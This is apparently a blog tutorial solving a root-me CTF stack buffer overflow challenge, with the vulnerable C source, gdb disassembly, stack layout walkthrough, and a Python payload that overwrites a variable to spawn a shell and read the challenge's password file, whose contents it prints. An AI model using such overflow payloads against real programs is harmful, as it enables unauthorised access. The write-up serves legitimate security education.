---
layout: post
title:  "Basic Buffer Overflow's - Chapter 1"
date:   2017-12-26 01:00:00 +0100
categories: [bof]
description: 
image:
  feature: shellcode.jpg
  credit:
  creditlink:
---

Still a WIP

Example 1 - Stack buffer overflow basic 1
=======================================
I'll be using the example from [root-me](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-1) to illustrate basic stack corruption.  Since this is a fairly trivial example and introductory, I hope they won't feel any issue with me posting a solution publicly.
```c
#include <stdlib.h>
#include <stdio.h>

/*
gcc -m32 -o ch13 ch13.c -fno-stack-protector
*/


int main()
{

  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     system("/bin/dash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```
The actual exploitation of this is fairly trivial.  The fgets function allows us to write 45 bytes of memory into a buffer of size 40.  We won't get any fancy EIP overwrites, but it does allow us to corrupt memory and potentially some of the variables.

Firstly, lets open this in gdb and run a disassembly of the main function.  There are better tools for doing this such as [radare2](https://github.com/radare/radare2), but we'll keep it simple for now.
```gdb
gdb$ disas main
Dump of assembler code for function main:
   0x08048494 <+0>:	push   ebp
   0x08048495 <+1>:	mov    ebp,esp
   0x08048497 <+3>:	and    esp,0xfffffff0
   0x0804849a <+6>:	sub    esp,0x40
   0x0804849d <+9>:	mov    DWORD PTR [esp+0x3c],0x4030201
   0x080484a5 <+17>:	mov    eax,ds:0x804a020
   0x080484aa <+22>:	mov    DWORD PTR [esp+0x8],eax
   0x080484ae <+26>:	mov    DWORD PTR [esp+0x4],0x2d
   0x080484b6 <+34>:	lea    eax,[esp+0x14]
   0x080484ba <+38>:	mov    DWORD PTR [esp],eax
   0x080484bd <+41>:	call   0x8048390 <fgets@plt>
   0x080484c2 <+46>:	mov    eax,0x8048620
   0x080484c7 <+51>:	lea    edx,[esp+0x14]
   0x080484cb <+55>:	mov    DWORD PTR [esp+0x4],edx
   0x080484cf <+59>:	mov    DWORD PTR [esp],eax
   0x080484d2 <+62>:	call   0x8048380 <printf@plt>
   0x080484d7 <+67>:	mov    eax,0x804862c
   0x080484dc <+72>:	mov    edx,DWORD PTR [esp+0x3c]
   0x080484e0 <+76>:	mov    DWORD PTR [esp+0x4],edx
   0x080484e4 <+80>:	mov    DWORD PTR [esp],eax
   0x080484e7 <+83>:	call   0x8048380 <printf@plt>
   0x080484ec <+88>:	cmp    DWORD PTR [esp+0x3c],0x4030201
   0x080484f4 <+96>:	je     0x804850c <main+120>
   0x080484f6 <+98>:	cmp    DWORD PTR [esp+0x3c],0xdeadbeef
   0x080484fe <+106>:	je     0x804850c <main+120>
   0x08048500 <+108>:	mov    DWORD PTR [esp],0x8048638
   0x08048507 <+115>:	call   0x80483a0 <puts@plt>
   0x0804850c <+120>:	cmp    DWORD PTR [esp+0x3c],0xdeadbeef
   0x08048514 <+128>:	jne    0x804853a <main+166>
   0x08048516 <+130>:	mov    DWORD PTR [esp],0x8048654
   0x0804851d <+137>:	call   0x80483a0 <puts@plt>
   0x08048522 <+142>:	mov    DWORD PTR [esp],0x804867e
   0x08048529 <+149>:	call   0x80483b0 <system@plt>
   0x0804852e <+154>:	mov    DWORD PTR [esp],0x8048688
   0x08048535 <+161>:	call   0x80483a0 <puts@plt>
   0x0804853a <+166>:	mov    eax,0x0
   0x0804853f <+171>:	leave
   0x08048540 <+172>:	ret
End of assembler dump.
```

So lets break this down and look at the parts where the buffer, and variables are placed onto the stack
```
   0x0804849d <+9>:	mov    DWORD PTR [esp+0x3c],0x4030201
```

Here our `check` variable is placed onto the stack at `esp+60`.  I will just convert arbitrarily between decimal and hexadecimal depending on the convenience.

```gdb
   0x080484a5 <+17>:	mov    eax,ds:0x804a020
   0x080484aa <+22>:	mov    DWORD PTR [esp+0x8],eax
   0x080484ae <+26>:	mov    DWORD PTR [esp+0x4],0x2d
   0x080484b6 <+34>:	lea    eax,[esp+0x14]
   0x080484ba <+38>:	mov    DWORD PTR [esp],eax
   0x080484bd <+41>:	call   0x8048390 <fgets@plt>
```
Here, the variables are popped onto the stack that will from the arguments being sent to the fgets function.  In 32-bit systems a function call takes it's arguments off the top of the stack so, in this case I'll try and convert the assembly into raw english step-by-step.

```gdb
mov    eax,ds:0x804a020 ; Place the value 0x804a020 into the eax register
mov    DWORD PTR [esp+0x8],eax  ; Take the value in the eax register, 0x804a020 , and place it at the memory location esp+0x8.
mov    DWORD PTR [esp+0x4],0x2d ; Take the value 0x2d, and place it at the memory location esp+0x4
lea    eax,[esp+0x14] ; Calculate the result of esp+0x14 and place it in the eax register
mov    DWORD PTR [esp],eax ; Take this result of esp+0x14 and place it at the location in memory denoted by esp.
```

So in effect we've placed at memory locations, esp, esp+0x4 and esp+0x8, three different values:
```
 -------------------
|     esp + 0x8     | <---- 0x804a020
 -------------------
|     esp + 0x4     | <---- 0x2d
 -------------------
|        esp        | <---- esp+0x14
 -------------------
```

Right after these operations take place, the `fgets` function is called.  These three values we've just placed on the stack as above are the arguments to the function `fgets` as in the C code.
```c
fgets(buf,45,stdin);
```

So `0x804a020` is the location of the stdin handle, `0x2d` is just 45 and `esp+0x14` will be where our buffer is located on the stack.

We've established earlier that our check variable is located at `esp+60` and since our buffer is at `esp+20`, if we place 44 bytes into fgets, the first 40 will fill the buffer, whilst the next 4 will overwrite the check variable.  Lets test this out quickly.  We'll use the following code to generate a file:
```bash
python -c 'print "A"*44'`> /tmp/overflow
```

We then pipe this through gdb into our program and we get:
```gdb
gdb$ run < /tmp/overflow
Starting program: /challenge/app-systeme/ch13/ch13 < /tmp/overflow

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[check] 0x41414141

You are on the right way!
[Inferior 1 (process 27133) exited normally]
--------------------------------------------------------------------------[regs]
  EAX:Error while running hook_stop:
No registers.
gdb$
```

So, we overwrote the check variable with our buffer, as 0x41 is the hex code for ascii 'A' so 0x41414141 is equivalent to `AAAA`.   To get our shell spawned, we need to overwrite our variable with `0xdeadbeef`, so we just write a file containing `A*40` followed by the bytes for 0xdeadbeef.  Code of the following form achieves this:

```python
import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef)
```
We run this and pipe it into our binary, and while we get a shell it isn't returned to us as interactive. (There was ways around this). 
```bash
app-systeme-ch13@challenge02:~$ python -c 'import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef);' | ./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ 
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
Shell closed! Bye.
```
We'll just pipe in another command to cat the .passwd file and we're returned with our password which is read by the dash command.

```bash
app-systeme-ch13@challenge02:~$ (python -c 'import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef)';echo cat .passwd) | ./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ 
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
1w4ntm0r3pr0np1s
Shell closed! Bye.
```

So to summarise, via an overflow, and an understanding of the stack, we've effectively corrupted and overwritten a stack variable via an overflow.
